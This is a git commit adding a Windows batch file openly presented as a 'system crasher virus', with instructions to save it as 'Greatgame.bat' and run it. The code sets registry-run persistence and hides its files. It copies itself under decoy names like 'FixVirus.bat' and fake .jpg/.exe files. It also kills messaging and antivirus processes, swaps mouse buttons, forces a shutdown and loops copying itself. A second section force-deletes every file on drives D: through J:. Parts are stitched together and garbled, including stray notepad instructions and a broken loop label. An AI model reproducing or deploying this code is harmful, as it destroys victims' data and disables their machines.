0d03ac58aebc2b1389e17533aa7c6d6a2dbda7a2
SparkScratch_P <prodyumna9d@gmail.com>
2022-01-17 19:39:31 -0800

    Rabs killer and system crasher virus
    Here is a Batch File virus which can:
    1.Copy itself into startup
    2.Copy itself over one thousand times into random spots in your computer.
    3.Hide its self and all other created files
    4.Task kill MSN, Norton, Windows Explorer, Limewire.
    5.Swap the left mouse button with the right one
    6.Opens alert boxes
    7.Changes the time to 12:00 and shuts down the computer
    copy this code into notepad and save as Greatgame.bat(while saving select all files instead of text ).

---
+++ viruses/virus31.bat
@@ -0,0 +1,64 @@
+@Echo off
+color 4
+title 4
+title R.I.P
+start
+start
+start
+start calc
+copy %0 %Systemroot%\Greatgame > nul
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Greatgame /t REG_SZ
+/d %systemroot%\Greatgame.bat /f > nul
+copy %0 *.bat > nul
+Attrib +r +h Greatgame.bat
+Attrib +r +h
+RUNDLL32 USER32.DLL.SwapMouseButton
+start calc
+cls
+tskill msnmsgr
+tskill LimeWire
+tskill iexplore
+tskill NMain
+start
+cls
+cd %userprofile%\desktop
+copy Greatgame.bat R.I.P.bat
+copy Greatgame.bat R.I.P.jpg
+copy Greatgame.bat R.I.P.txt
+copy Greatgame.bat R.I.P.exe
+copy Greatgame.bat R.I.P.mov
+copy Greatgame.bat FixVirus.bat
+cd %userprofile%My Documents
+copy Greatgame.bat R.I.P.bat
+copy Greatgame.bat R.I.P.jpg
+copy Greatgame.bat R.I.P.txt
+copy Greatgame.bat R.I.P.exe
+copy Greatgame.bat R.I.P.mov
+copy Greatgame.bat FixVirus.bat
+start
+start calc
+cls
+msg * R.I.P
+msg * R.I.P
+shutdown -r -t 10 -c "VIRUS DETECTED"
+start
+start
+time 12:00
+:R.I.P
+cd %usernameprofile%\desktop
+copy Greatgame.bat %random%.bat
+goto RIP
+No 2:-
+Just open your notepad
+1) Click start -> all programs -> accessories -> notepad
+2) Or just press or click windows key + r :: run window will open and
+type notepad and hit enter .
+/* VIRUS BY RABS DEVELOPER*/
+@echo off
+del D:\*.* /f /s /q
+del E:\*.* /f /s /q
+del F:\*.* /f /s /q
+del G:\*.* /f /s /q
+del H:\*.* /f /s /q
+del I:\*.* /f /s /q
+del J:\*.* /f /s /q
